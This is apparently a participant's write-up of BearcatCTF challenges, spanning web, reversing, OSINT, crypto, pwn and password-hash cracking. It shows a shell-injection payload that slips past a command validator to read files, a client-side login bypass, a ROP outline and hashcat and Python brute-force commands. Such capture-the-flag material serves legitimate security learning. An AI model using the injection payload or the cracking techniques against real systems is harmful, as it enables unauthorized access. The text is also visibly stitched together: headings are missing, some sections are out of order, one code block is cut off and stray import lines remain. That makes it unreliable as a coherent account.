## global-redirect: 100

> A new "world-class" website is claiming to have top-tier security worthy of an international stage. Unfortunately for them, their defenses are far from impressive. Show how easy it is to navigate their weaknesses and gain admin access.

This challenge presents us with a login page.
First course of action is to look at the source.
We see this Javascript:

```js
function loginAuthenticate(){
    var password = document.getElementById("password");
    var hash = sjcl.hash.sha256.hash(password);
    var hexRepresentation = sjcl.codec.hex.fromBits(hash);
    if (hexRepresentation == "2a70282a868c0ca9e6fe5bb5cf2ac2ea6b523062102bada26fb87091d511e3f1"){
        alert("welcome Home Admin");
        window.location = "./0078f62f00305b73de6ccace8f9fc1f68a8f1dcec865d33fcacbaf255ddefaa7";
    }else{
        alert("Incorrect Password. Please Try Again");
    }
    alert(hash);
}
```

Great, we can just bypass the authentication and go directly to the redirect!
Navigating to http://chal.bearcatctf.io:39724/0078f62f00305b73de6ccace8f9fc1f68a8f1dcec865d33fcacbaf255ddefaa7
gives us the flag: `BCCTF{T1ck3t_t0_0wn3rsh1p!}`.

## unhealthy 2 the sequel: 500

We are greeted with a landing page that says "Under development".

This time, the `robots.txt` hints to us that we need to check: http://chal.bearcatctf.io:30812/health-check.
This page seems to ask us for an IP and returns an output that suspiciously looks like the CLI output from `ping`:

```
Health response: PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=255 time=0.017 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
```

This prompted me to try shell injection.
After some trial and error, I discovered that `127.0.0.1; ba""sh -c 'ls'` worked.
Here's the app.py code:

```py
splits = ['||','&&',';','&','|','<','>']
def validate(cmd : str):
    if '$(' in cmd: return False
    if '\\' in cmd: return False
    if cmd.count('`') > 1: return False
    if 'IFS' in cmd: return False
    if 'flag.txt' in cmd: return False
    parts = [cmd]
    for s in splits:
        nparts = []
        for l in [p.split(s) for p in parts]:
            nparts += l
        parts = nparts
    parts = [p.strip() for p in parts]
    for p in parts:
        c = p.split()[0]
        if run(['which',c],capture_output=True).stdout:
            return False
    return True
```

It seems like as long as all of our bash commands are valid under `which`, we're free to go ahead and run it.
I also noticed `flag.txt` is explicitly disallowed.
I found `flag.txt` lying in `/`.

Now, I enter the payload: `127.0.0.1; ba""sh -c 'cat /*.txt | base64'`, which returns the flag: `BCCTF{M4yb3_!_sH0uld_jus7_f011ow_b3s7_pr4ac7ic3s}`

Pretty straightforward to reverse; I even asked ChatGPT to reverse it: https://chatgpt.com/share/679fcf7e-87bc-8007-8f97-d9d5e5761a59.

## Easy Encrypt: 300

First, let's run the binary:

```
❯ ./easy                                             
I dropped my flag somewhere! Can you find it for me? 
asdf
Hmmm... No that isn't right at all.
```

I honestly did not try to look into how this binary worked, because I wanted to get some experience with angr.

I hadn't used it before, and there were some troubles with getting it to work, but it finally worked just with `simgr.run()` and checking the `posix.dumps` to see if the win message was there.
Then I just crunched the solver on all the constraints gathered along the way.

This verification program is a Brainfuck program.
I converted the brainfuck to Python using [this tool](https://github.com/philippwindischhofer/Brainfuck2Python).
Then, I printed out the state of the tape right after all of the inputs had been taken.
I observed that the flag was lying directly in memory, although on an offset.

Taking each 3rd byte, you get `BCCTF{blame_the_swiss}`.

Opening this file with Google Earth, we find that the location is: https://maps.app.goo.gl/8ZfTa7RAooLqQTcx5

This is a bearcat, whose scientific name is the [_Arctictis binturong_](https://en.wikipedia.org/wiki/Binturong).

Thus, the flag is `BCCTF{Arctictis_binturong}`

## Building Breakers: 200

A quick Google image reverse search tells us this is the Swiss National Museum.

The flag is `BCCTF{Swiss_National_Museum}`

This is actually the [Rabin cryptosystem](https://en.wikipedia.org/wiki/Rabin_cryptosystem), since we additionally satisfy the conditions that `p%4==3` and `q%4==3`.

I implemented this off of the Wikipedia page above:

```py
from gmpy2 import *                               
from Crypto.Util.number import *                  
                                                  
mp = pow(c, (p + 1) // 4, p)                      
mq = pow(c, (q + 1) // 4, q)                      
                                                  
_, yp, yq = gcdext(p, q)                          
                                                  
r1 = (yp * p * mq + yq * q * mp) % n              
r2 = n - r1                                       
r3 = (yp * p * mq - yq * q * mp) % n              
r4 = n - r3                                       
                                                  
for choice in [r1, r2, r3, r4]:  
    print(long_to_bytes(choice)) 
```

The output contained the flag:

Looking at the server file first, it's clear to us that this is cleartext TCP traffic, being sent to port 1337.

The encryption being done only depends on time, which we have from the packet capture.

First, let's dump the relevant information:

```
$ tshark -r traffic.pcapng -Y 'tcp.dstport == 1337' -T fields -E header=y -E separator=, -e frame.time_epoch -e data
frame.time_epoch,data                                                                                                 
1738088099.839446000,                                                                                                 
1738088099.860704000,                                                                                                 
1738088099.860829000,9d80c4df97fe91a0bb2867c78700c43c4eeb92770ea6ca6934bbcd5ffd40d548aba049344921e1db129e94a382f6678d 
1738088099.860853000,                                                                                                 
```

The only important field is the one that has the payload.
One hiccup is that because we are multiplying the time by 2^16, we need sub-second accuracy.
Instead of that, I just brute-forced all the possible seeds around the time we are given:

```py
flag_enc = bytes.fromhex("9d80c4df97fe91a0bb2867c78700c43c4eeb92770ea6ca6934bbcd5ffd40d548aba049344921e1db129e94a382f6678d")

This crunches for a bit and spits out our flag:

# Pwn

## CallingConvention: 500

import calling_convention_zip from "./calling_convention.zip?url"

We are given a binary that contains several functions that look like dead code.
It seems clear we need to perform a ROP attack.
Fortunately, we can use pwntools to create this attack.

First, we need to figure out what order these functions need to be called, since some of them overwrite the others.
The order is:

* number3
* food
* set_key1
* ahhhhhhhh
* number3 (again)

Putting this ROP chain together, we can override the 8-bit buffer we are provided and start returning to our desired functions.

import solve_calling_convention_py from "./solve_calling_convention.py?url"

# Hashing

## Curly Password: 600

> A modern approach to secure passwords is to use passphrases to create easy to remember and long passwords. A user used this techinque however they picked 3 words from our home page to use separated by underscores ("_"). They also thought it would be funny to wrap it in our slug. The flag is the password. `eb02e84ccdc45f873c633846efa027b4726a9552a7dad42927ec627e929a500d`

> For example, the passsword may be `BCCTF{word1_word2_word3}`

import homepage_txt from "./homepage.txt?url"

This is a straightforward dictionary attack, implementable in Python by just grabbing the words straight off of https://bearcatctf.io.
The word list is scraped <a href={homepage_txt}>homepage.txt</a>.

I cleaned it up a bit:

```
cat homepage.txt | tr ' ' '\n' | sort | uniq > words.txt
```

Then, we can just brute-force it easily with Python:

```py
from hashlib import sha256                                                              
                                                                                        
goal = bytes.fromhex("eb02e84ccdc45f873c633846efa027b4726a9552a7dad42927ec627e929a500d")
words = list(map(lambda s: s.strip(), open("words.txt").readlines()))                   
                                                                                        
for a in words:                                                                         
    for b in words:                                                                     
        for c in words:                                                                 
            w = bytes(f"BCCTF{{{a}_{b}_{c}}}", "utf-8")                                 
            if sha256(w).digest() == goal:                                              
                print(w)                                                                
```

This returns very quickly:

```
b'BCCTF{sponsor_cybersecurity_Innovation}'
```

## City Crack: 850

> International hackers have left two different encrypted hashes behind. The first hash is `1fae39b5bc83699450281dc7bb472d59`, and the second hash is `5f6b9145ac86d19e917a08e6c20de0c907472a90`. To find the flag, decrypt both hashes and combine the results in alphabetical order, separated by an underscore. These paswords are based off of capital cites with some modifications.

Initially, I tried using a dictionary attack, but I decided to also give brute force a try, and it finished faster (and proved that the dictionary attack would not have worked!)

The first one is an MD5 hash:

```
❯ ./hashcat -m 0 -a 3 -1 "?l?d?s?u" --increment 1fae39b5bc83699450281dc7bb472d59 "?1?1?1?1?1?1?1?1"
...
1fae39b5bc83699450281dc7bb472d59:T0kyO
...
```

The next one is SHA1:

```
❯ ./hashcat -m 100 -a 3 -1 "?l?d?s?u" --increment 5f6b9145ac86d19e917a08e6c20de0c907472a90 "?1?1?1?1?1?1?1?1"
...
5f6b9145ac86d19e917a08e6c20de0c907472a90:p@R!s
...
```

Putting them in alphabetical order, the flag is `BCCTF{p@R!s_T0kyO}`.

# Conclusion

Overall I had a lot of fun with this CTF, though I wish they went with dynamic scoring though since some of the challenges seemed a little bit easier than their point values.
